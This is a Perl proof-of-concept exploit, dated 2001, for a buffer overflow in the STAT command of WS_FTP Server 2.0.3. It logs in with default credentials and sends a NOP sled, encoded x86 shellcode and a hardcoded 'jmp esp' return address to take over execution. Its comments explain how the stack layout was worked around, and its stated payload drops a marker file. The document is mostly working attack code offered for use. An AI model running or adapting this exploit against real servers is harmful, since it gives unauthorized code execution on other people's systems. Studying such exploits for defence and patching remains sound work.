#########################################################################
#
# WS_FTP Server 2.0.3 STAT proof-of-concept exploit
# By andreas@defcom.com (C)2001
#
# 
# There are a couple of things screwing up this exploit. First, the
# total number of bytes we control in the area where ESP is pointing,
# corresponds to the number of bytes in the domain name. So, to make sure
# it works on as many systems as possible, Im only using 2 bytes here.
# So, we have to jump back through the buffer... Fun.. :)
# Second, the number of bytes needed to overwrite EIP is dependant on the
# number of bytes in the server name.
# Third, the stack has to be moved to the heap, because there is no
# good place on the stack, it just ends with CreateFile overwriting stuff.
#
# Im using a "jump esp" in shlwapi.dll(0x70beed87) as the return address,
# change this if it does not work on your system.
#
#########################################################################
$login="ftp";	#username
$pass="ftp";	#password
#########################################################################
$ARGC=@ARGV;
if ($ARGC !=1) {
	print "WS_FTP server 2.0.3 STAT proof-of-concept exploit\n";
	print "It creates a file named defcom.iyd in the c-root\n";
	print "(C)2001 andreas\@defcom.com\n";
   	print "Usage: $0 <host>\n";
	print "Example: $0 127.0.0.1\n";
	exit;
}
use Socket;

my($remote,$port,$iaddr,$paddr,$proto);
$remote=$ARGV[0];
$port = "21";

$iaddr = inet_aton($remote) or die "Error: $!";
$paddr = sockaddr_in($port, $iaddr) or die "Error: $!";
$proto = getprotobyname('tcp') or die "Error: $!";

socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die "Error: $!";
connect(SOCK, $paddr) or die "Error: $!";
###########################################################################################
# get servername and length of domain
recv(SOCK,$reply,1024,0);
@split1 = split(/\ /,$reply);
@split2 = split(/\-/,$split1[0]);
$servername = $split2[1];
$pos = index($servername,"\.");
if ($pos == -1) { print "Error: Domain has to be atleast two characters"; exit; }
$domain = substr($servername,$pos);
if (length($domain) < 2) { print "Error: Domain has to be atleast two characters"; exit; }
###########################################################################################

sleep(1);
$msg = "user $login\n"; 
send(SOCK, $msg, 0) or die "Cannot send query: $!";
$msg = "pass $pass\n";
sleep(1);
send(SOCK, $msg, 0) or die "Cannot send query: $!";
$sploit="\xeb\x03\x5a\xeb\x05\xe8\xf8\xff\xff\xff\x8b\xc2\x83\xc0\x1a\xeb\x02\xeb\x80\x33";
$sploit = $sploit . "\xc9\x66\xb9\xd6\x80\x66\x81\xf1\x80\x80\x80\x30\x99\x40\xe2\xfa\x12";
$sploit = $sploit . "\x7b\x1a\x75\x92\x12\x75\xcb\xf1\x99\x63\x99\x99\xf1\xd9\x99\x99\x99";
$sploit = $sploit . "\x27\x45\x8d\xdc\x99\x66\x8f\xc3\x9c\x99\x63\x99\x99\x12\x79\x12\x75";
$sploit = $sploit . "\xaa\x59\xf1\x19\x99\x99\x99\xf3\x9b\xc9\xc9\xf1\x99\x99\x99\x89\x1a";
$sploit = $sploit . "\x5b\xfb\xcb\x27\xbd\x8c\xdc\x99\x66\x8f\xaa\x59\xc9\x27\x89\x8f\xdc";
$sploit = $sploit . "\x99\x66\x8f\xfa\xa3\xc5\xfd\xfc\xff\xfa\xf6\xf4\xb7\xf0\xe0\xfd\x99";
$msg = "stat " . "\x90" x (480-length($sploit)-length($servername)) . $sploit . "\x87\xed\xbe\x70" . "\x90" x 16 . "\xeb\x81" . "\r\n";
print $msg;
sleep(1);
send(SOCK, $msg, 0) or die "Cannot send query: $!";
sleep(1);
exit;